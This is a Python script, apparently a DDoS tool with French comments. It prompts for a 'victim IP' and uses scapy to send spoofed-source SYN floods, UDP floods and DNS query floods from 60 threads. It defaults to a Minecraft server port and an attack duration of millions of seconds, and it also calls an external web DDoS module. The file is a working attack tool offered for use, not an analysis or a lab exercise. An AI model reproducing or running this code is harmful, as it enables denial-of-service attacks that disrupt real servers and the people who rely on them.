import time
import random
import threading
from multiprocessing import Process, Manager
from scapy.all import IP, TCP, UDP, ICMP, DNS, send, DNSQR, conf

conf.verb = 0
attack_threads = []
start_time = 0
dns_pckts = 0
syn_pckts = 0
udp_pckts = 0
should_clear = False

def generate_traffic(destination_ip, destination_port, packet_count):
    while True:
        protocols = ["TCP", "UDP", "ICMP"]
        print("Generation de traffic normal...")
        for _ in range(packet_count):
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            src_port = random.randint(1024, 65535)
            protocol = random.choice(protocols)

            if protocol == "TCP":
                packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port)
            elif protocol == "UDP":
                packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
            elif protocol == "ICMP":
                packet = IP(src=src_ip, dst=destination_ip) / ICMP()

            send(packet, verbose=0)
            
            time.sleep(0.001)
        time.sleep(3)

def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack_duration):
    global attack_threads, start_time
    attack_end_time = time.time() + attack_duration
    s = conf.L2socket(iface="Wi-Fi")

    def print_statistics():
        global dns_pckts, syn_pckts, udp_pckts, should_clear, start_time
        while True:
            time.sleep(1)
            elapsed_time = time.time() - start_time
            start_time = time.time()
            print(f"Paquets par seconde: {dns_pckts + syn_pckts + udp_pckts / elapsed_time:.2f}")
            should_clear = True
            dns_pckts = 0
            syn_pckts = 0
            udp_pckts = 0
            should_clear = False

    def dns_attack():
        global dns_pckts
        while time.time() < attack_end_time:
            for _ in range(packet_count):
                src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                query_name = destination_ip  # Remplacez par le nom de domaine cible

                packet = IP(src=src_ip, dst=destination_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
                s.send(packet)

                if not should_clear:
                    dns_pckts += 1

    def syn_flood_attack():
        global syn_pckts
        while time.time() < attack_end_time:
            for _ in range(packet_count):
                src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                src_port = random.randint(1024, 65535)

                packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="S")
                s.send(packet)

                if not should_clear:
                    syn_pckts += 1


    def udp_lag_attack():
        global udp_pckts
        while time.time() < attack_end_time:
            for _ in range(packet_count):
                src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                src_port = random.randint(1024, 65535)

                packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
                s.send(packet)

                if not should_clear:
                    udp_pckts += 1

    # Ajoutez les fonctions d'attaque spécifiques à la liste des threads
    for _ in range(20):
        attack_threads.append(threading.Thread(target=dns_attack))
        attack_threads.append(threading.Thread(target=syn_flood_attack))
        attack_threads.append(threading.Thread(target=udp_lag_attack))

    attack_threads.append(threading.Thread(target=print_statistics))    

    # Lancez tous les threads
    for thread in attack_threads:
        thread.start()
    
    import web_ddos
    web_ddos.launch_web_ddos(f"http://{destination_ip}")

if __name__ == "__main__":
    destination_ip = input("Enter victim IP: ")
    
    destination_port = 25565  # Remplacez par le port de votre destination
    ddos_traffic_count = 10000
    attack_duration = 6000000  # Durée totale de l'attaque en secondes
    normal_traffic_count = 30
    traffic_type = input("Enter 'normal' to launch normal traffic or 'attack' to launch attack traffic: ")
    normal_process, ddos_process = None, None
    with Manager() as manager:
        packets_per_second = manager.Value('i', 0)
        lock = manager.Lock()
        if traffic_type.lower() == 'normal':
            print("\nSimulating normal traffic...")
            normal_process = Process(target=generate_traffic, args=(destination_ip, destination_port, normal_traffic_count, packets_per_second, lock,))
            normal_process.start()
        elif traffic_type.lower() == 'attack':
            print("\nSimulating attack traffic...")
            ddos_process = Process(target=generate_ddos_traffic, args=(destination_ip, destination_port, ddos_traffic_count, attack_duration,))
            ddos_process.start()
        else:
            print("Invalid input. Please enter 'normal' or 'attack'.")
            exit(1)
        start_time = time.time()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Terminating processes...")
            if normal_process is not None:
                normal_process.terminate()
            if ddos_process is not None:
                ddos_process.terminate()
    print("End.")